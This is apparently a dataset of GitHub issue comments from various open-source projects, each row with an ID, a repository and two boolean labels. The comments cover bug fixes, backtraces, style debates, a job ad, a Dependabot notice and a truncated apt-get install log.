rubyzip/rubyzip/307/191656841,rubyzip/rubyzip/307,"Scenario I have a function that downloads the zipped code from aws s3-bucket. Extracts the zip file in a temp folder and then modifies few files from the extracted zip file and create a zip after modification. Later when I try to delete the temp folder it throws me ""The process cannot access the file because it is being used by another process."" (NOTE everything takes place in the same process meaning in the same function). After carefully looking the code found in the below code  def writeEntries(entries, path, io) entries.each { |e|   zipFilePath = path == """" ? e  File.join(path, e)   diskFilePath = File.join(@friend, zipFilePath)   puts ""Deflating "" + diskFilePath   if  File.directory?(diskFilePath)     io.mkdir(zipFilePath)     subdir =Dir.entries(diskFilePath); subdir.delete("".""); subdir.delete("".."")     writeEntries(subdir, zipFilePath, io)   else     io.get_output_stream(zipFilePath) { |f| f.puts(File.open(diskFilePath, ""rb"").read())}   end }  end In line  io.get_output_stream(zipFilePath) { |f| f.puts(File.open(diskFilePath, ""rb"").read())}, the file is opened but not closed. Solution   So I modified the above line of code as follows disk_file = File.open(diskFilePath, ""rb"") io.get_output_stream(zipFilePath) { |f|             f.puts(file_disk.read())         }  file_disk.close and was successfully able to delete the temp folder.  Would be great if the modification can be included in the file. Thanks, Zaid ",False,True
declarative-lookup-rollup-summaries/afawcett/149/99643954,declarative-lookup-rollup-summaries/afawcett/149,"@friend @friend , How would you guys feel about an additional checkbox on the entry page that is named ""Add trailing space""? I think this is something we should fix as I've been asked about this exact issue when we can't make things rich text. ",False,True
leveldb/google/519/408673841,leveldb/google/519,"Hi -- no pressure, but is there any ETA for when Windows support will land? Thanks! ",False,True
zfs/zfsonlinux/7960/457913319,zfs/zfsonlinux/7960,"This is long overdue, this project needs a code of conduct. ",False,True
zfs/zfsonlinux/7401/379845437,zfs/zfsonlinux/7401,@friend Would you edit your post to use a pastebin? ,False,True
react-helmet/nfl/373/446052884,react-helmet/nfl/373,"I can understand why this guy is frustrated, given that there is no new release for this package more than a year, but I don't agree on how he diss the maintainers or contributers. I think you guys should have released a patched version for v5 without the rollup. ",False,True
bootstrap/twbs/3057/5138709,bootstrap/twbs/3057,@friend Your fork does not minify this example correctly if (confirm('Are you sure?') &amp;&amp;     !false) {     alert('ok'); } ,False,True
nativefier/jiahaog/29/203755943,nativefier/jiahaog/29,I think you can use webContents.findInPageText()! ,False,True
julia/JuliaLang/29438/425732695,julia/JuliaLang/29438,"I was about to say almost the same thing as @friend just wrote. Things may go better if you adjust your attitude a bit. You're not entitled to an answer—this is not customer support and you're not paying. If anyone answers, it's because they're generously donating their time, energy and expertise to help you. GitHub is where the people who build Julia work. Those are often the very same people who are best able to answer your questions on discourse. Annoying the people who can help you is not a great strategy for getting answers. ",False,True
bootstrap/twbs/24475/338701085,bootstrap/twbs/24475,I've wanted to ask about using something like Gatsbyjs as an alternative or is that a crazier ask than Hugo? At least it'd be just node dependency instead of using brew to install Hugo. I'd work on something like that. ,False,True
ceph/ceph/12105/263364067,ceph/ceph/12105,@friend I think that we should keep it simple and the change minimal ,False,True
godot/godotengine/28739/490260242,godot/godotengine/28739,"Can confirm on Windows 10 build 17134, with Godot 3.2-dev df18c8c &lt;details&gt;&lt;summary&gt;Backtrace for breakpoint 1&lt;/summary&gt; &lt;p&gt;  [0] __chkstk (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\misc\amd64\chkstk.asm109) [1] PacketPeerput_var (c\users\user\repositories\godot\core\io\packet_peer.cpp103) [2] ScriptDebuggerRemote_put_variable (c\users\user\repositories\godot\core\script_debugger_remote.cpp118) [3] ScriptDebuggerRemotedebug (c\users\user\repositories\godot\core\script_debugger_remote.cpp241) [4] GDScriptLanguagedebug_break (c\users\user\repositories\godot\modules\gdscript\gdscript_editor.cpp237) [5] GDScriptFunctioncall (c\users\user\repositories\godot\modules\gdscript\gdscript_function.cpp1519) [6] GDScriptInstancecall (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1181) [7] Objectcall (c\users\user\repositories\godot\core\object.cpp921) [8] Variantcall_ptr (c\users\user\repositories\godot\core\variant_call.cpp1068) [9] GDScriptFunctioncall (c\users\user\repositories\godot\modules\gdscript\gdscript_function.cpp1075) [10] GDScriptInstance_ml_call_reversed (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1206) [11] GDScriptInstancecall_multilevel_reversed (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1215) [12] Node_notification (c\users\user\repositories\godot\scene\main\node.cpp148) [13] CanvasItem_notificationv (c\users\user\repositories\godot\scene\2d\canvas_item.h166) [14] Objectnotification (c\users\user\repositories\godot\core\object.cpp954) [15] Node_propagate_ready (c\users\user\repositories\godot\scene\main\node.cpp193) [16] Node_propagate_ready (c\users\user\repositories\godot\scene\main\node.cpp182) [17] Node_set_tree (c\users\user\repositories\godot\scene\main\node.cpp2561) [18] SceneTreeinit (c\users\user\repositories\godot\scene\main\scene_tree.cpp456) [19] OS_Windowsrun (c\users\user\repositories\godot\platform\windows\os_windows.cpp2831) [20] widechar_main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp151) [21] _main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp175) [22] main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp185) [23] __scrt_common_main_seh (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl288) [24] BaseThreadInitThunk -- END OF BACKTRACE -- &lt;/p&gt; &lt;/details&gt;&lt;details&gt;&lt;summary&gt;Backtrace for breakpoint 2&lt;/summary&gt; &lt;p&gt;  [0] __chkstk (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\misc\amd64\chkstk.asm109) [1] __chkstk (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\misc\amd64\chkstk.asm109) [2] PacketPeerput_var (c\users\user\repositories\godot\core\io\packet_peer.cpp103) [3] ScriptDebuggerRemote_put_variable (c\users\user\repositories\godot\core\script_debugger_remote.cpp118) [4] ScriptDebuggerRemotedebug (c\users\user\repositories\godot\core\script_debugger_remote.cpp241) [5] GDScriptLanguagedebug_break (c\users\user\repositories\godot\modules\gdscript\gdscript_editor.cpp237) [6] GDScriptFunctioncall (c\users\user\repositories\godot\modules\gdscript\gdscript_function.cpp1519) [7] GDScriptInstancecall (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1181) [8] Objectcall (c\users\user\repositories\godot\core\object.cpp921) [9] Variantcall_ptr (c\users\user\repositories\godot\core\variant_call.cpp1068) [10] GDScriptFunctioncall (c\users\user\repositories\godot\modules\gdscript\gdscript_function.cpp1075) [11] GDScriptInstance_ml_call_reversed (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1206) [12] GDScriptInstancecall_multilevel_reversed (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1215) [13] Node_notification (c\users\user\repositories\godot\scene\main\node.cpp148) [14] CanvasItem_notificationv (c\users\user\repositories\godot\scene\2d\canvas_item.h166) [15] Objectnotification (c\users\user\repositories\godot\core\object.cpp954) [16] Node_propagate_ready (c\users\user\repositories\godot\scene\main\node.cpp193) [17] Node_propagate_ready (c\users\user\repositories\godot\scene\main\node.cpp182) [18] Node_set_tree (c\users\user\repositories\godot\scene\main\node.cpp2561) [19] SceneTreeinit (c\users\user\repositories\godot\scene\main\scene_tree.cpp456) [20] OS_Windowsrun (c\users\user\repositories\godot\platform\windows\os_windows.cpp2831) [21] widechar_main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp151) [22] _main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp175) [23] main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp185) [24] __scrt_common_main_seh (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl288) [25] BaseThreadInitThunk -- END OF BACKTRACE -- &lt;/p&gt; &lt;/details&gt;",False,True
rdpwrap/stascorp/611/450316704,rdpwrap/stascorp/611,"Hi Everyone, I have tried with this .ini file and it worked for me, it's for 10.0.17763.167 version x64 rdpwrap.zip  First, stop the service running CMD as administrator, then run net stop termservice Replace rdpwrap.ini in C\Program Files\RDP Wrapper then run net start termservice Very important Reboot your PC then when your pc rebooted, run RDPConf to check the states, make sure All states are green ",False,True
rdpwrap/stascorp/645/458893824,rdpwrap/stascorp/645,"Works great, thank you ) I tried it on another computer (windows 10 installation with the same windows build version as the first computer) and it works. I ll simply reinstall windows on the first computer and i am sure it ll work. Thank you once again ) PS It worked instantly on the other ciomputer. Without any problem. ",False,True
ansible/ansible/13262/201463542,ansible/ansible/13262,Using 2.1.0 devel and getting ,False,True
jekyll/jekyll/6948/387647384,jekyll/jekyll/6948,"I would love to see an offically supported page generator from data files. With the stellar rise of ""headless"" (= API only) SaaS CMS systems static site generators have become the tool of choice for types of sites that they have not been considered for in the past. e.g. contentful.com  provides an official jekyll plugin that pulls all the CMS content into the Jekyll _data folder as yaml.  You can then use that content inside pages and include you've already created, but you can't actively create new pages from the SaaS CMS.  This is possible with other generators, but I'd like to stick with Jekyll due to your maturity and ecosystem. e.g. the site I'm maintaining is a mix of content maintained by techies directly in the jekyll git and content written and uploaded by less technical people in contentful. contentful triggers the redeploy on netlify.com  via  webhook when a new article was published. Overall a great stack, just that we have to rely on a somewhat unmaintained hacky ""page generator"" jekyll plugin to stitch it together. ",False,True
bootstrap/twbs/3057/5136945,bootstrap/twbs/3057,"Wow. I've read @friend's reasoning for not using semis, but when it comes to actual problems cropping up in the real world, why does ""aesthetic"" preference take precedence? Why write something like just to avoid placing a semi a the end? ♠!` is clearly not meant to do this job. It's a bool operator. Does the fact that the symbol looks prettier really matter? I am well aware that you can hack your way around this and keep saying ""nuh uh!"" instead of admitting that it's ill conceived and improving, but seriously making a snippy response like that just makes you look like an immature hipster smarting off to a battle worn professional. @friend is on the technical committee for fuck's sake. ",False,True
rails/rails/33677/414870475,rails/rails/33677,"Good intentions, but I doubt there's any relation of the origin of the terms blacklist/whitelist to race. There are many idioms and phrases in the English language that make use of colours without any racial backstories. I haven't met any black person (myself included) who was ever offended by the use of ""blacklist"". Frankly, a good number find it patronising to make this kind of change. ",False,True
bootstrap/twbs/3057/5140859,bootstrap/twbs/3057,"People coming from different programming background are trying to adapt or style JavaScript to the environment they are familiar with.  There's nothing wrong in that.  JavaScript already has some bad things, but it also has many good things as well. Let the language be as it is and adapt it to what is best suited without breaking things that are already present.  Love the language for the good and respect the quirkiness as this language has evolved from a toy language to one of the most used and talked about language in the world. Respect the members who have been trying to put sanity to the language and come up with guidelines and tools to make it work and understandable across various segments. Style and beauty comes later.  What matters is the language's consistency. So, if that means putting a semicolon, why can't that be? Again not for flaming this discussion. It has taken ages to make people realize the good and bad parts of the JS language, so why not respect that and move ahead. If opensource is about sharing, then its also about caring (caring for all the apps already running which has been developed years before some developers were born).. Definitely one can fork and move ahead, but that's not the point of this discussion, I guess. By the way.. I love bootstrap as being a non-designer it helps me quickly build beautiful websites ) ",False,True
zfs/zfsonlinux/8259/452902510,zfs/zfsonlinux/8259,"The underlying issue comes from kernel commit 12209993e98c5fa1855c467f22a24e3d5b8be205 (""x86/fpu Don't export kernelfpu{begin,end}()""), which unexports kernel_fpu_begin(), and causes the configure tests not to define HAVE_FPU_API_H.  Changing the header locations will just lead to another failure later because kernel_fpu_begin/end() are exported GPL, and can't be used directly from the zfs module. See the thread on LKML starting here ",False,True
classroom/education/1678/432752999,classroom/education/1678,"Hey @friend, this is behavior is managed in GitHub.com and therefore we are not the best place report this to. The best you can do is contact GitHub support about this ",False,True
bootstrap/twbs/13327/40256551,bootstrap/twbs/13327,"Sorry, we can't help you with MVC-specific issues. Perhaps try asking on StackOverflow or on Microsoft support forums. ",False,True
hyperbox/hyperbox/10/253327454,hyperbox/hyperbox/10,"After saving the configuration, you should have a related task in the hyperbox client window at the bottom. Can you double click on that task and let me know the exact error message displayed there? it's the last text field in the window. ",False,True
bootstrap/twbs/3057/5262227,bootstrap/twbs/3057,@friend Do you know what QED means? Making semicolons required in the spec would be a web-breaking change.  TC-39 will never do that. ,False,True
RasPlex/RasPlex/562/379328648,RasPlex/RasPlex/562,yeah that would be great. or at least short instructions how the driver could be installed manually? (mt7610) because the instructions from here are not working on the libreelec/rasplex system  ,False,True
ansible/ansible/13262/309239420,ansible/ansible/13262,@friend and @friend not sure why you gave my previous comment a thumbs down ,False,True
flood/jfurrow/240/338082580,flood/jfurrow/240,"FWIW, the passphrase can be left blank as is. ",False,True
serverless-stack-com/AnomalyInnovations/63/348713946,serverless-stack-com/AnomalyInnovations/63,@friend I'm not too familiar with your setup so I can't really help. But maybe somebody else can. ,False,True
DietPi/Fourdee/1912/403342675,DietPi/Fourdee/1912,License pre-reqs ,False,True
openDCIM/samilliken/1114/450221473,openDCIM/samilliken/1114,"from login_ldap.php, line 148 this code has a hard-coded 'cn' in it, so it assumes activedirectory type member changing it to 'uid' and everything works. ",False,True
for_testings/beubiJenkins/2305/226741453,for_testings/beubiJenkins/2305,"Approved by ""N/A"" on QEM. Comments 1 ",False,True
flood/jfurrow/240/338181833,flood/jfurrow/240,"Bonus, just pass the username then. ",False,True
npm/npm/21202/404530671,npm/npm/21202,"The key is revoking all npmrc tokens globally before the attacker takes action. If this isn't done soon enough, the only way to completely prevent the damage is the manual audit of the entire npm registry, and that is borderline impossible. (so i'm really hoping npm revokes everything soon enough, otherwise I'll just have to stop using it) ",False,True
KnpMenu/KnpLabs/213/129397811,KnpMenu/KnpLabs/213,please also enable the directory cache for $HOME/.composer/cache/files so that we have a change to reuse cached downloads between builds ,False,True
react-helmet/nfl/373/407982283,react-helmet/nfl/373,@friend not sure how that could speed up  in  ,False,True
puppeteer-sharp/kblok/736/441081615,puppeteer-sharp/kblok/736,"Guys, I found a similar issue for puppeteer.  this case the workaround was adding --no-sandbox on chromium, is this a ""solution""? ",False,True
bootstrap/twbs/3057/5239225,bootstrap/twbs/3057,"@friend that's a horrible reference and one should never look at that page. As @friend indicated, If Javascript didn't require semicolons, then it wouldn't be called ""Automatic Semicolon Insertion"". This sentence should end the discussion but apparently didn't . ",False,True
core/owncloud/27775/302927402,core/owncloud/27775,@friend Worked. Thanks. ,False,True
expo/expo/3030/451466823,expo/expo/3030,"Hi, im having problems with the expo client since today   Perharps it could be  related to this merge? ",False,True
electron/electron/17171/468982227,electron/electron/17171,NoOne Responded ,False,True
jobs/TechnologyMasters/144/352303209,jobs/TechnologyMasters/144,"Grupee - App Developer - New York City Salary Equity. 2% - 5% Benefits None Perks  Work your own schedule Choose your own custom setup  Location New York City, NY What you will do Develop a Minimum Vial Product (MVP) for a social media platform. Nothing major in the UX/UI department but having experience with this is a must. I will need the front end and back end as well, but a bigger emphasis on the back end. Skills iOS, Swift, coding, mobile development, UI, UX, back end, front end. Must Have  3+ years in mobile development  If you deployed apps of your own is a plus.  Relevant Experience  mobile technology up to date on current mobile trend  Who we are We are Grupee and we are new social media platform. We are looking into changing the dynamic on how we usually would interact on social media platforms. How to contact us Email will be the quickest way to reach us. Shoot your resume as well if you have one available. Subject should say “Grupee Applicant”. Please send an email to Jon.bell@friend.us  [ ] Full Time [ ] Part Time [x] Contract/Partnership [ ] Internship [ ] Remote Worldwide [ ] Remote Regional [ ] Remote OK  ",False,True
taurus/taurus-org/137/260361013,taurus/taurus-org/137, status waiting ♢ resolved  Original comment by cpascual (,False,True
OpenUpgrade/OCA/500/224311413,OpenUpgrade/OCA/500,"Interesting, thank you. Tentative plus one (no test). ",False,True
pycodestyle/PyCQA/703/370551544,pycodestyle/PyCQA/703,"PyFlakes wouldn't accept this for the very reason that it's so controversial. They only accept obvious problems, e.g., unused imports. If this isn't satisfactory here, a different stylistic option for having it would be via a Flake8 AST plugin. Luckily,  already provides this check using the AST but a quick check of the source indicates that it's as strict as this check is. I'd suggest either collaborating with bugbear or creating a new plugin that meets the specific needs. As it stands, this discussion seems to be getting heated. I'm going to lock the thread because it's devolved from constructive conversation to far less productive conversation. ",False,True
xml2csv/wmfs/11/341777670,xml2csv/wmfs/11,"Updates the requirements on @friend/git to permit the latest version. &lt;details&gt; &lt;summary&gt;Release notes&lt;/summary&gt;  *Sourced from [@friend/git's releases]( See full diff in [compare view]( /&gt;  Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting .  If all status checks pass Dependabot will automatically merge this pull request.  ---  **Note** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.  You can always request more updates by clicking  in your [Dependabot dashboard]( commands and options&lt;/summary&gt; &lt;br /&gt;  You can trigger Dependabot actions by commenting on this PR -  will rebase this PR -  will merge this PR after your CI passes on it -  will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself) -  will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself) -  will set the current labels as the default for future PRs for this repo and language -  will set the current reviewers as the default for future PRs for this repo and language -  will set the current assignees as the default for future PRs for this repo and language -  will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme  Additionally, you can set the following in your Dependabot [dashboard]( Update frequency (including time of day and day of week) - Automerge options (never/patch/minor, and dev/runtime dependencies) - Pull request limits (per update run and/or open at any time) - Out-of-range updates (receive only lockfile updates, if desired) - Security updates (receive only security updates, if desired)  Finally, you can contact us by mentioning @friend.  &lt;/details&gt;",False,True
netmiko/ktbyers/1074/456263391,netmiko/ktbyers/1074,"@friend  that looks more modular, you can update the code with the suggested solution. Im ok with it. ",False,True
rpki.net/dragonresearch/198/169979018,rpki.net/dragonresearch/198,"fresh vm (ubuntu 14.4 i386) {{{ rpki.dfw.rg.net/root# apt-get install rpki-rp rpki-ca Reading package lists... Done Building dependency tree Reading state information... Done The following extra packages will be installed   apache2 apache2-bin apache2-data fontconfig fontconfig-config   fonts-dejavu-core libaio1 libapache2-mod-wsgi libapr1 libaprutil1   libaprutil1-dbd-sqlite3 libaprutil1-ldap libcairo2 libdatrie1   libdbd-mysql-perl libdbi-perl libfile-copy-recursive-perl libfontconfig1   libgraphite2-3 libharfbuzz0b libpango-1.0-0 libpangocairo-1.0-0   libpangoft2-1.0-0 libpixman-1-0 librrd4 libterm-readkey-perl libthai-data   libthai0 libxcb-render0 libxcb-shm0 libxml2-utils libxrender1 libxslt1.1   libyaml-0-2 mysql-client mysql-client-5.5 mysql-client-core-5.5 mysql-server   mysql-server-5.5 mysql-server-core-5.5 python-dateutil python-django   python-django-south python-lxml python-mysqldb python-netifaces   python-vobject python-yaml rrdtool ssl-cert update-inetd xinetd xsltproc Suggested packages   apache2-doc apache2-suexec-pristine apache2-suexec-custom apache2-utils   libclone-perl libmldbm-perl libnet-daemon-perl libplrpc-perl   libsql-statement-perl ttf-baekmuk ttf-arphic-gbsn00lp ttf-arphic-bsmi00lp   ttf-arphic-gkai00mp ttf-arphic-bkai00mp tinyca python-psycopg2   python-psycopg python-flup python-sqlite geoip-database-contrib gettext   python-django-doc ipython bpython libgdal1 python-lxml-dbg   python-egenix-mxdatetime python-mysqldb-dbg librrds-perl openssl-blacklist Recommended packages   ttf-dejavu ttf-bitstream-vera libhtml-template-perl libjs-jquery The following NEW packages will be installed   apache2 apache2-bin apache2-data fontconfig fontconfig-config   fonts-dejavu-core libaio1 libapache2-mod-wsgi libapr1 libaprutil1   libaprutil1-dbd-sqlite3 libaprutil1-ldap libcairo2 libdatrie1   libdbd-mysql-perl libdbi-perl libfile-copy-recursive-perl libfontconfig1   libgraphite2-3 libharfbuzz0b libpango-1.0-0 libpangocairo-1.0-0   libpangoft2-1.0-0 libpixman-1-0 librrd4 libterm-readkey-perl libthai-data   libthai0 libxcb-render0 libxcb-shm0 libxml2-utils libxrender1 libxslt1.1   libyaml-0-2 mysql-client mysql-client-5.5 mysql-client-core-5.5 mysql-server   mysql-server-5.5 mysql-server-core-5.5 python-dateutil python-django   python-django-south python-lxml python-mysqldb python-netifaces   python-vobject python-yaml rpki-ca rpki-rp rrdtool ssl-cert update-inetd   xinetd xsltproc 0 to upgrade, 55 to newly install, 0 to remove and 7 not to upgrade. Need to get 17.9 MB of archives. After this operation, 145 MB of additional disk space will be used. Do you want to continue? [Y/n]  Get1  trusty/main python-django-south all 1.0-0.1 [107 kB] Get2  trusty/main libaio1 i386 0.3.109-4 [6,578 B] Get3  trusty/main libapr1 i386 1.5.0-1 [88.8 kB] Get4  trusty/main libaprutil1 i386 1.5.3-1 [76.6 kB] Get5  trusty/main fonts-dejavu-core all 2.34-1ubuntu1 [1,024 kB] Get6  trusty/main rpki-rp i386 0.6088~trusty [1,015 kB] Get7  trusty-updates/main fontconfig-config all 2.11.0-0ubuntu4.1 [47.4 kB] Get8  trusty-updates/main libfontconfig1 i386 2.11.0-0ubuntu4.1 [124 kB] Get9  trusty/main libpixman-1-0 i386 0.30.2-2ubuntu1 [216 kB] Get10  trusty/main libxcb-render0 i386 1.10-2ubuntu1 [11.9 kB] Get11  trusty/main libxcb-shm0 i386 1.10-2ubuntu1 [5,622 B] Get12  trusty-updates/main libxrender1 i386 10.9.8-1build0.14.04.1 [17.5 kB] Get13  trusty-updates/main libcairo2 i386 1.13.0~20140204-0ubuntu1.1 [550 kB] Get14  trusty/main rpki-ca i386 0.6088~trusty [105 kB] Get15  trusty/main libdatrie1 i386 0.2.8-1 [17.3 kB] Get16  trusty/main libgraphite2-3 i386 1.2.4-1ubuntu1 [54.4 kB] Get17  trusty-updates/main libharfbuzz0b i386 0.9.27-1ubuntu1 [125 kB] Get18  trusty/main libthai-data all 0.1.20-3 [130 kB] Get19  trusty/main libthai0 i386 0.1.20-3 [17.1 kB] Get20  trusty-updates/main fontconfig i386 2.11.0-0ubuntu4.1 [175 kB] Get21  trusty-updates/main libpango-1.0-0 i386 1.36.3-1ubuntu1.1 [148 kB] Get22  trusty-updates/main libpangoft2-1.0-0 i386 1.36.3-1ubuntu1.1 [32.6 kB] Get23  trusty-updates/main libpangocairo-1.0-0 i386 1.36.3-1ubuntu1.1 [20.0 kB] Get24  trusty/main libxslt1.1 i386 1.1.28-2build1 [140 kB] Get25  trusty-updates/main libyaml-0-2 i386 0.1.4-3ubuntu3.1 [46.3 kB] Get26  trusty/main libdbi-perl i386 1.630-1 [881 kB] Get27  trusty/main libdbd-mysql-perl i386 4.025-1 [99.6 kB] Get28  trusty/main libterm-readkey-perl i386 2.31-1 [27.2 kB] Get29  trusty-updates/main mysql-client-core-5.5 i386 5.5.44-0ubuntu0.14.04.1 [701 kB] Get30  trusty-updates/main mysql-client-5.5 i386 5.5.44-0ubuntu0.14.04.1 [1,557 kB] Get31  trusty-updates/main mysql-server-core-5.5 i386 5.5.44-0ubuntu0.14.04.1 [3,481 kB] Get32  trusty-updates/main mysql-server-5.5 i386 5.5.44-0ubuntu0.14.04.1 [1,962 kB] Get33  trusty/main libaprutil1-dbd-sqlite3 i386 1.5.3-1 [10.3 kB] Get34  trusty/main libaprutil1-ldap i386 1.5.3-1 [8,552 B] Get35  trusty-updates/main apache2-bin i386 2.4.7-1ubuntu4.5 [825 kB] Get36  trusty-updates/main apache2-data all 2.4.7-1ubuntu4.5 [159 kB] Get37  trusty-updates/main apache2 i386 2.4.7-1ubuntu4.5 [87.6 kB] Get38  trusty-updates/main libapache2-mod-wsgi i386 3.4-4ubuntu2.1.14.04.2 [65.6 kB] Get39  trusty/main libfile-copy-recursive-perl all 0.38-1 [20.6 kB] Get40  trusty/main librrd4 i386 1.4.7-2ubuntu5 [128 kB] Get41  trusty-updates/main libxml2-utils i386 2.9.1+dfsg1-3ubuntu4.4 [33.5 kB] Get42  trusty-updates/main mysql-client all 5.5.44-0ubuntu0.14.04.1 [12.1 kB] Get43  trusty-updates/main mysql-server all 5.5.44-0ubuntu0.14.04.1 [12.2 kB] Get44  trusty/main python-dateutil all 1.5+dfsg-1ubuntu1 [48.9 kB] Get45  trusty-updates/main python-django all 1.6.1-2ubuntu0.9 [2,211 kB] Get46  trusty-updates/main python-lxml i386 3.3.3-1ubuntu0.1 [583 kB] Get47  trusty/main python-mysqldb i386 1.2.3-2ubuntu1 [54.6 kB] Get48  trusty/main python-netifaces i386 0.8-3build1 [11.2 kB] Get49  trusty/universe python-vobject all 0.8.1c-4ubuntu1 [47.9 kB] Get50  trusty-updates/main python-yaml i386 3.10-4ubuntu0.1 [96.9 kB] Get51  trusty/main ssl-cert all 1.0.33 [16.6 kB] Get52  trusty/main update-inetd all 4.43 [19.2 kB] Get53  trusty/main xsltproc i386 1.1.28-2build1 [13.2 kB] Get54  trusty/main rrdtool i386 1.4.7-2ubuntu5 [330 kB] Get55  trusty/main xinetd i386 12.3.15-3ubuntu1 [102 kB] Fetched 17.9 MB in 14s (1,225 kB/s) Extract templates from packages 100% Preconfiguring packages ... Selecting previously unselected package libaio1i386. (Reading database ... 89537 files and directories currently installed.) Preparing to unpack .../libaio1_0.3.109-4_i386.deb ... Unpacking libaio1i386 (0.3.109-4) ... Selecting previously unselected package libapr1i386. Preparing to unpack .../libapr1_1.5.0-1_i386.deb ... Unpacking libapr1i386 (1.5.0-1) ... Selecting previously unselected package libaprutil1i386. Preparing to unpack .../libaprutil1_1.5.3-1_i386.deb ... Unpacking libaprutil1i386 (1.5.3-1) ... Selecting previously unselected package fonts-dejavu-core. Preparing to unpack .../fonts-dejavu-core_2.34-1ubuntu1_all.deb ... Unpacking fonts-dejavu-core (2.34-1ubuntu1) ... Selecting previously unselected package fontconfig-config. Preparing to unpack .../fontconfig-config_2.11.0-0ubuntu4.1_all.deb ... Unpacking fontconfig-config (2.11.0-0ubuntu4.1) ... Selecting previously unselected package libfontconfig1i386. Preparing to unpack .../libfontconfig1_2.11.0-0ubuntu4.1_i386.deb ... Unpacking libfontconfig1i386 (2.11.0-0ubuntu4.1) ... Selecting previously unselected package libpixman-1-0i386. Preparing to unpack .../libpixman-1-0_0.30.2-2ubuntu1_i386.deb ... Unpacking libpixman-1-0i386 (0.30.2-2ubuntu1) ... Selecting previously unselected package libxcb-render0i386. Preparing to unpack .../libxcb-render0_1.10-2ubuntu1_i386.deb ... Unpacking libxcb-render0i386 (1.10-2ubuntu1) ... Selecting previously unselected package libxcb-shm0i386. Preparing to unpack .../libxcb-shm0_1.10-2ubuntu1_i386.deb ... Unpacking libxcb-shm0i386 (1.10-2ubuntu1) ... Selecting previously unselected package libxrender1i386. Preparing to unpack .../libxrender1_1%3a0.9.8-1build0.14.04.1_i386.deb ... Unpacking libxrender1i386 (10.9.8-1build0.14.04.1) ... Selecting previously unselected package libcairo2i386. Preparing to unpack .../libcairo2_1.13.0~20140204-0ubuntu1.1_i386.deb ... Unpacking libcairo2i386 (1.13.0~20140204-0ubuntu1.1) ... Selecting previously unselected package libdatrie1i386. Preparing to unpack .../libdatrie1_0.2.8-1_i386.deb ... Unpacking libdatrie1i386 (0.2.8-1) ... Selecting previously unselected package libgraphite2-3i386. Preparing to unpack .../libgraphite2-3_1.2.4-1ubuntu1_i386.deb ... Unpacking libgraphite2-3i386 (1.2.4-1ubuntu1) ... Selecting previously unselected package libharfbuzz0bi386. Preparing to unpack .../libharfbuzz0b_0.9.27-1ubuntu1_i386.deb ... Unpacking libharfbuzz0bi386 (0.9.27-1ubuntu1) ... Selecting previously unselected package libthai-data. Preparing to unpack .../libthai-data_0.1.20-3_all.deb ... Unpacking libthai-data (0.1.20-3) ... Selecting previously unselected package libthai0i386. Preparing to unpack .../libthai0_0.1.20-3_i386.deb ... Unpacking libthai0i386 (0.1.20-3) ... Selecting previously unselected package fontconfig. Preparing to unpack .../fontconfig_2.11.0-0ubuntu4.1_i386.deb ... Unpacking fontconfig (2.11.0-0ubuntu4.1) ... Selecting previously unselected package libpango-1.0-0i386. Preparing to unpack .../libpango-1.0-0_1.36.3-1ubuntu1.1_i386.deb ... Unpacking libpango-1.0-0i386 (1.36.3-1ubuntu1.1) ... Selecting previously unselected package libpangoft2-1.0-0i386. Preparing to unpack .../libpangoft2-1.0-0_1.36.3-1ubuntu1.1_i386.deb ... Unpacking libpangoft2-1.0-0i386 (1.36.3-1ubuntu1.1) ... Selecting previously unselected package libpangocairo-1.0-0i386. Preparing to unpack .../libpangocairo-1.0-0_1.36.3-1ubuntu1.1_i386.deb ... Unpacking libpangocairo-1.0-0i386 (1.36.3-1ubuntu1.1) ... Selecting previously unselected package libxslt1.1i386. Preparing to unpack .../libxslt1.1_1.1.28-2build1_i386.deb ... Unpacking libxslt1.1i386 (1.1.28-2build1) ... Selecting previously unselected package libyaml-0-2i386. Preparing to unpack .../libyaml-0-2_0.1.4-3ubuntu3.1_i386.deb ... Unpacking libyaml-0-2i386 (0.1.4-3ubuntu3.1) ... Selecting previously unselected package libdbi-perl. Preparing to unpack .../libdbi-perl_1.630-1_i386.deb ... Unpacking libdbi-perl (1.630-1) ... Selecting previously unselected package libdbd-mysql-perl. Preparing to unpack .../libdbd-mysql-perl_4.025-1_i386.deb ... Unpacking libdbd-mysql-perl (4.025-1) ... Selecting previously unselected package libterm-readkey-perl. Preparing to unpack .../libterm-readkey-perl_2.31-1_i386.deb ... Unpacking libterm-readkey-perl (2.31-1) ... Selecting previously unselected package mysql-client-core-5.5. Preparing to unpack .../mysql-client-core-5.5_5.5.44-0ubuntu0.14.04.1_i386.deb ... Unpacking mysql-client-core-5.5 (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package mysql-client-5.5. Preparing to unpack .../mysql-client-5.5_5.5.44-0ubuntu0.14.04.1_i386.deb ... Unpacking mysql-client-5.5 (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package mysql-server-core-5.5. Preparing to unpack .../mysql-server-core-5.5_5.5.44-0ubuntu0.14.04.1_i386.deb ... Unpacking mysql-server-core-5.5 (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package mysql-server-5.5. Preparing to unpack .../mysql-server-5.5_5.5.44-0ubuntu0.14.04.1_i386.deb ... Unpacking mysql-server-5.5 